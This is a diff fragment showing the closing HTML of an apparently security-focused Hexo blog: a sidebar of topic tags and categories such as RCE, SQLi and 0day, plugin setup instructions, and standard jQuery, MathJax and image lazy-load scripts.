+        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
+    
+        <span class="sidebar-tag-name" data-tags="Tomcat"><span class="iconfont-archer">&#xe606;</span>Tomcat</span>
+    
+        <span class="sidebar-tag-name" data-tags="LFI"><span class="iconfont-archer">&#xe606;</span>LFI</span>
+    
+        <span class="sidebar-tag-name" data-tags="RCE"><span class="iconfont-archer">&#xe606;</span>RCE</span>
+    
+        <span class="sidebar-tag-name" data-tags="Weblogic"><span class="iconfont-archer">&#xe606;</span>Weblogic</span>
+    
+        <span class="sidebar-tag-name" data-tags="Deserialize"><span class="iconfont-archer">&#xe606;</span>Deserialize</span>
+    
+        <span class="sidebar-tag-name" data-tags="Chrome"><span class="iconfont-archer">&#xe606;</span>Chrome</span>
+    
+        <span class="sidebar-tag-name" data-tags="cobaltstirke"><span class="iconfont-archer">&#xe606;</span>cobaltstirke</span>
+    
+        <span class="sidebar-tag-name" data-tags="Discuz"><span class="iconfont-archer">&#xe606;</span>Discuz</span>
+    
+        <span class="sidebar-tag-name" data-tags="F5"><span class="iconfont-archer">&#xe606;</span>F5</span>
+    
+        <span class="sidebar-tag-name" data-tags="CVE-2020-5902"><span class="iconfont-archer">&#xe606;</span>CVE-2020-5902</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞分析"><span class="iconfont-archer">&#xe606;</span>漏洞分析</span>
+    
+        <span class="sidebar-tag-name" data-tags="fastjson"><span class="iconfont-archer">&#xe606;</span>fastjson</span>
+    
+        <span class="sidebar-tag-name" data-tags="Frida"><span class="iconfont-archer">&#xe606;</span>Frida</span>
+    
+        <span class="sidebar-tag-name" data-tags="java"><span class="iconfont-archer">&#xe606;</span>java</span>
+    
+        <span class="sidebar-tag-name" data-tags="jenkins"><span class="iconfont-archer">&#xe606;</span>jenkins</span>
+    
+        <span class="sidebar-tag-name" data-tags="SQLi"><span class="iconfont-archer">&#xe606;</span>SQLi</span>
+    
+        <span class="sidebar-tag-name" data-tags="Redis"><span class="iconfont-archer">&#xe606;</span>Redis</span>
+    
+        <span class="sidebar-tag-name" data-tags="struts"><span class="iconfont-archer">&#xe606;</span>struts</span>
+    
+        <span class="sidebar-tag-name" data-tags="SSRF"><span class="iconfont-archer">&#xe606;</span>SSRF</span>
+    
+        <span class="sidebar-tag-name" data-tags="ThinkPHP"><span class="iconfont-archer">&#xe606;</span>ThinkPHP</span>
+    
+        <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
+    
+        <span class="sidebar-tag-name" data-tags="XXE"><span class="iconfont-archer">&#xe606;</span>XXE</span>
+    
+        <span class="sidebar-tag-name" data-tags="OpenCV"><span class="iconfont-archer">&#xe606;</span>OpenCV</span>
+    
+        <span class="sidebar-tag-name" data-tags="智能合约"><span class="iconfont-archer">&#xe606;</span>智能合约</span>
+    
+        <span class="sidebar-tag-name" data-tags="spider"><span class="iconfont-archer">&#xe606;</span>spider</span>
+    
+        <span class="sidebar-tag-name" data-tags="smali"><span class="iconfont-archer">&#xe606;</span>smali</span>
+    
+        <span class="sidebar-tag-name" data-tags="hw2020"><span class="iconfont-archer">&#xe606;</span>hw2020</span>
+    
+        <span class="sidebar-tag-name" data-tags="深信服"><span class="iconfont-archer">&#xe606;</span>深信服</span>
+    
+        <span class="sidebar-tag-name" data-tags="0day"><span class="iconfont-archer">&#xe606;</span>0day</span>
+    
+        <span class="sidebar-tag-name" data-tags="CAPTCHA"><span class="iconfont-archer">&#xe606;</span>CAPTCHA</span>
+    
+        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="编程"><span class="iconfont-archer">&#xe60a;</span>编程</span>
+    
+        <span class="sidebar-category-name" data-categories="代码审计"><span class="iconfont-archer">&#xe60a;</span>代码审计</span>
+    
+        <span class="sidebar-category-name" data-categories="Pentest"><span class="iconfont-archer">&#xe60a;</span>Pentest</span>
+    
+        <span class="sidebar-category-name" data-categories="渗透"><span class="iconfont-archer">&#xe60a;</span>渗透</span>
+    
+        <span class="sidebar-category-name" data-categories="逆向"><span class="iconfont-archer">&#xe60a;</span>逆向</span>
+    
+        <span class="sidebar-category-name" data-categories="其他"><span class="iconfont-archer">&#xe60a;</span>其他</span>
+    
+        <span class="sidebar-category-name" data-categories="验证码"><span class="iconfont-archer">&#xe60a;</span>验证码</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Sariel.D"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var i=n.imageLazyLoadSetting.isSPA,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){i&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,e,a=0;a<r.length;a++)t=r[a],e=void 0,0<=(e=t.getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(n.innerHeight||document.documentElement.clientHeight)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e&&e()},n.src=i}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body>
+</html>
+
+
